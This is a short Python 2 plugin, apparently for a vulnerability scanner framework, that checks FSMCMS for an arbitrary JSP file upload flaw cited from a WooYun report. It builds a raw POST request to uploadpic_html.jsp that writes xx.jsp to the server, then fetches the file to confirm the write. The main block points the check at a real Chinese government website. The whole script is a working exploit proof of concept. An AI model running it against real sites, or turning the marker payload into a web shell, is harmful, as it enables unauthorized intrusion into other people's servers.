#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#__author__ = '这个程序员不太冷'
#ref http://www.wooyun.org/bugs/wooyun-2015-0144274/
import urlparse
def assign(service, arg):
    if service == "fsmcms":
        return True, arg


def audit(arg):
    arr=urlparse.urlparse(arg)
    raw='''POST /cms/client/uploadpic_html.jsp?toname=xx.jsp&diskno=xxxx HTTP/1.1
Host: %s
Content-Length: 69
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0
Connection: keep-alive
Accept: */*
Accept-Encoding: gzip, deflate

<?xml version="1.0" encoding="UTF-8"?>

<root>

test_vul

</root>
''' % arr.netloc
    url=arg+'cms/client/uploadpic_html.jsp?toname=xx.jsp&diskno=xxxx'
    code, head,res, errcode, _ = curl.curl2(url,raw=raw)
    if 'dGVzdF92dWw=' in res:
        payload='cms-data/temp_dir/xxxx/temp.files/xx.jsp'
        url=arg+payload
        code, head,res, errcode, _ = curl.curl2(url)
        if 'test_vul' in res:
            security_hole(url)
                                
if __name__ == '__main__':
    from dummy import *
    audit(assign('fsmcms', 'http://www.sxjz.gov.cn/')[1])